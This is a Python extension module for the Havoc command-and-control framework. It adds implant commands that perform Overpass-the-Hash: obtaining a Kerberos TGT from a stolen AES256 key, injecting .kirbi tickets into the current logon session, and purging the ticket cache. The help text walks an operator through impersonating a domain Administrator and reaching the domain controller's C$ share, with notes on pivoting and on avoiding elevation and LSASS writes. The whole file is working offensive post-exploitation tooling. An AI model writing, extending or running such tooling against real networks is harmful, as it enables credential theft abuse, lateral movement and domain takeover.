from havoc import Demon, RegisterCommand
import os


OVERPASS_HELP = """overpass /user:<sam> /domain:<fqdn> /aes256:<hex> /dc:<host-or-ip>

    Self-contained Overpass-the-Hash.  Performs a Kerberos AS-REQ with the
    supplied AES256 key as pre-auth, parses the AS-REP, decrypts the enc-part,
    builds a KRB-CRED containing the TGT + session key, and submits it to the
    current logon session via LsaCallAuthenticationPackage(KerbSubmitTicketMessage).

    NO external tools (impacket, Rubeus).  NO LSASS memory writes.
    Fully reversible via `overpass_purge`.

ARGS
    /user:<sam>       target user (required)
    /domain:<fqdn>    target domain, UPPERCASED for Kerberos realm (required)
    /aes256:<hex>     64 hex chars = 32-byte AES256 key (required)
    /dc:<host-or-ip>  DC hostname or IP that answers Kerberos on TCP/88 (required)

EXAMPLE
    Demon » overpass /user:Administrator /domain:halcyon.local /aes256:56baaf5139c4ed94b0b6c53a430daa705aa1ace929f2e685db4980e5b7ec2f51 /dc:halcyondc.halcyon.local
    Demon » shell klist                               # verify TGT in current LUID
    Demon » shell dir \\\\HALCYONDC\\C$                # Kerberos auth as Administrator
    Demon » overpass_purge                            # revert

NOTES
    - Works on all Windows builds (uses public LSA API, no mimikatz structs).
    - Needs TCP/88 egress to the DC.  If direct TCP fails, pivot via SOCKS or
      submit a pre-built .kirbi with the `overpass_file` command below.
    - No elevation / SeDebugPrivilege required.  Any user can submit a ticket
      to its own LUID.
"""


OVERPASS_FILE_HELP = """overpass_file <path-to-local-kirbi>

    Submit a pre-built Kerberos TGT (.kirbi) from the operator's filesystem
    into the Demon's current LUID.  Fallback for when direct TCP:88 from the
    target isn't an option — build the ticket externally (impacket) and ship
    it through this command.
"""


OVERPASS_PURGE_HELP = """overpass_purge
    Purge all Kerberos tickets from the current LUID's cache.  Revert path
    for both `overpass` and `overpass_file`.
"""


def _parse_args_blob(params):
    """Join Havoc *params with spaces into a single utf-8 blob for the BOF."""
    return " ".join(params)


def overpass(demonID, *params):
    demon = Demon(demonID)

    if not params:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, OVERPASS_HELP)
        return

    args = _parse_args_blob(params)

    packer = Packer()
    packer.addbytes(args.encode("utf-8"))

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon: overpass {args}")
    demon.InlineExecute(TaskID, "go", f"bin/overpass.{demon.ProcessArch}.o",
                        packer.getbuffer(), False)
    return TaskID


def overpass_file(demonID, *params):
    demon = Demon(demonID)

    if len(params) != 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, OVERPASS_FILE_HELP)
        return

    local_path = params[0]
    if not os.path.isfile(local_path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            f"overpass_file: kirbi not found locally: {local_path}")
        return

    try:
        with open(local_path, "rb") as f:
            ticket = f.read()
    except Exception as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"overpass_file: read failed: {e}")
        return

    if len(ticket) < 32:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"overpass_file: ticket too small ({len(ticket)} bytes)")
        return

    packer = Packer()
    packer.addbytes(ticket)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon: submit TGT ({len(ticket)} bytes) to current LUID")
    demon.InlineExecute(TaskID, "go", f"bin/kerb_ptt.{demon.ProcessArch}.o",
                        packer.getbuffer(), False)
    return TaskID


def overpass_purge(demonID, *params):
    demon = Demon(demonID)
    if params:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "overpass_purge takes no arguments")
        return

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Tasked demon: purge Kerberos ticket cache for current LUID")
    demon.InlineExecute(TaskID, "go", f"bin/kerb_purge.{demon.ProcessArch}.o",
                        b"", False)
    return TaskID


RegisterCommand(overpass, "", "overpass",
    "Overpass-the-Hash: self-contained AS-REQ with AES256, no external tools", 0,
    OVERPASS_HELP,
    "overpass /user:Administrator /domain:halcyon.local /aes256:<64-hex> /dc:halcyondc.halcyon.local")

RegisterCommand(overpass_file, "", "overpass_file",
    "Submit a pre-built .kirbi TGT into current LUID (fallback for when KDC isn't reachable)", 0,
    OVERPASS_FILE_HELP,
    "overpass_file /tmp/Administrator.kirbi")

RegisterCommand(overpass_purge, "", "overpass_purge",
    "Purge current LUID's Kerberos ticket cache (reverts overpass / overpass_file)", 0,
    OVERPASS_PURGE_HELP,
    "overpass_purge")
